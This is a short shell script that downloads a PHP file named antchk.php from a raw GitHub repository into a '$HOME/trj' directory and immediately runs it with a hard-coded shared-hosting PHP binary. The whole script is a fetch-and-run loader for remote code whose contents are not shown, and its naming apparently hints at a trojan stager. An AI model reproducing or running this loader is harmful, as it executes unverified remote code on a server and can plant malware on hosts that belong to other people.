#!/bin/sh
D=$HOME/trj; mkdir -p "$D"; cd "$D" || exit 1
curl -fsSL -o antchk.php.new "https://raw.githubusercontent.com/a04032417-svg/Dar101/trj/trj/antchk.php?t=$(date +%s)" && mv antchk.php.new antchk.php
/opt/alt/php83/usr/bin/php antchk.php "$1"
